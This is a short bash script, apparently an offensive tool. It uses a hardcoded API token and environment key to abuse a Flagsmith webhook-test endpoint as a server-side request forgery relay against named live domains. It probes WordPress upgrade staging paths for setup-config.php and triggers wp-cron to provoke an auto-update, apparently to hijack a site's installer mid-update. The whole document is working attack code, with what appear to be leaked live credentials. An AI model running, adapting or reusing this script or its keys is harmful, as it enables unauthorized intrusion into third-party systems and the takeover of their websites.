#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="0cb53dd00f936c2de9e7ba6061bdf7f93e596d2b"
EKEY="Ldqx3Z27VxYrTFXgWYiZhb"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

echo "IP: $(curl -s https://ifconfig.me)"

# Step 1: Check if upgrade staging directory already exists
echo "=== CHECK STAGING ==="
# Try common WP version staging paths
for ver in "7.1.4" "6.7.12" "6.7.11" "6.8" "6.8.1" "7.0" "7.1" "7.1.3"; do
  echo -n "wordpress-$ver -> "
  SSRF "https://koinp2p.com/wp-content/upgrade/wordpress-${ver}/wp-admin/setup-config.php"
  echo ""
done

# Step 2: Trigger wp-cron to initiate auto-update
echo "=== TRIGGER CRON ==="
SSRF "https://koinp2p.com/wp-cron.php?doing_wp_cron=1"
echo ""

# Step 3: After triggering cron, immediately check staging again
echo "=== POST-CRON STAGING ==="
for ver in "7.1.4" "6.7.12"; do
  echo -n "wordpress-$ver -> "
  SSRF "https://koinp2p.com/wp-content/upgrade/wordpress-${ver}/wp-admin/setup-config.php"
  echo ""
done
